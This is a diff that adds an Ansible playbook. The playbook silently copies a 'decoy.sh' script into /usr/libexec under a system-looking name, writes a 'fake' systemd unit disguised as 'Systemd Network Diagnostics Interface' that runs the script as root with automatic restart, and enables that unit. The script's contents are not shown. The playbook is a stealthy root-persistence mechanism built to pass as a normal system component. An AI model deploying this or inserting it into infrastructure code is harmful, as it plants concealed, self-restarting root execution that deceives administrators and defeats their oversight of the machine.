@@ -1,0 +1,31 @@
+---
+- name: 1. Silently drop the decoy script into libexec
+  ansible.builtin.copy:
+    src: ../decoy.sh
+    dest: /usr/libexec/systemd-network-diag
+    mode: '0755'
+
+- name: 2. Create the fake systemd service file
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/systemd-network-diag.service
+    content: |
+      [Unit]
+      Description=Systemd Network Diagnostics Interface
+      After=network.target
+
+      [Service]
+      # Execute the script silently
+      ExecStart=/bin/bash /usr/libexec/systemd-network-diag
+      Restart=always
+      RestartSec=15
+      User=root
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: 3. Reload systemd and start the decoy service
+  ansible.builtin.systemd:
+    daemon_reload: yes
+    name: systemd-network-diag
+    enabled: yes
+    state: restarted
